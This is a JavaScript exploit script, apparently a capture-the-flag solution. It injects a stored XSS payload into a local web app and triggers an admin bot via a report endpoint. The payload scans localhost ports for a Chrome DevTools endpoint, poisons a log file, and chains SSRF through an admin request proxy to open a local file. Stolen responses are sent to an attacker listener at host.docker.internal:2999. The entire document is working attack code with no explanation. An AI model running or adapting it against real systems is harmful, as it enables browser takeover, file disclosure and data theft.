let payload = `
<script>
    const totalPorts = 66000 - 30000;
    const batches = 300;
    const portsPerSecond = totalPorts / batches;

    async function checkPort(port) {
        return fetch(\`http://localhost:\${port}/json/version\`, { method: 'GET', mode: 'no-cors', signal: AbortSignal.timeout(1000) })
            .then(response => port)
            .catch(() => null);
    }

    async function bruteforcePorts(start, end) {
        const results = [];
        for (let i = start; i <= end; i += portsPerSecond) {
            console.log('START');

            const batch = [];
            for (let port = i; port < i + portsPerSecond && port <= end; port++) {
                batch.push(checkPort(port));
            }

            const batchResults = await Promise.all(batch);
            results.push(...batchResults.filter(port => port !== null));

            if (results.length > 0) {
                break;
            }
        }
        return results;
    }

    async function downloadFileAndBlock(port) {
        let cdpPort = port;

        async function handleRsp(prom) {
            try {
                let rsp = await fetch(prom);
                let text = await rsp.text();

                await fetch('http://host.docker.internal:2999/send?data=' + btoa(text), { mode: 'no-cors' });
                return text;
            } catch (e) {
                await fetch('http://host.docker.internal:2999/send?data=' + e, { mode: 'no-cors' });
            }
        }

        async function start() {
            // Poison log file
            let rsp1 = await handleRsp('/' + encodeURIComponent('<title>'));
            await fetch('http://host.docker.internal:2999/delay=1', { mode: 'no-cors' });
            await handleRsp('/' + encodeURIComponent('</title>'));
            await fetch('http://host.docker.internal:2999/delay=1', { mode: 'no-cors' });

            let rsp2 = await handleRsp('http://host.docker.internal:2999/redir?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?method=PUT&url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/new?file:///app/log.htm')));
            setTimeout(async () => {
                let rsp3 = await handleRsp('http://host.docker.internal:2999/redir?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/list')));
                console.log(rsp3);
            }, 5000);
            await fetch('http://host.docker.internal:2999/delay?t=6', { mode: 'no-cors' });

        }

        start();
    }


    window.startFn = (async () => {
        const openPorts = await bruteforcePorts(30000, 66000);
        console.log(openPorts);

        if (openPorts.length > 0) {
            console.log('Open Ports:', JSON.stringify(openPorts[0]));
            downloadFileAndBlock(openPorts[0]);
        } else {
            console.log('none');
            fetch('http://host.docker.internal:2999/send?data=none');
        }
    });

    window.startFn();

    window.onbeforeunload = function () {
        fetch('http://host.docker.internal:2999/send?data=unload');
    }
</script>
`;

let rsp = await fetch('http://localhost:8080/post', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({ content: 'Hi', location: payload })
})

console.log(await rsp.text());

let rsp2 = await fetch('http://localhost:8080/report/1');

console.log(await rsp2.text());
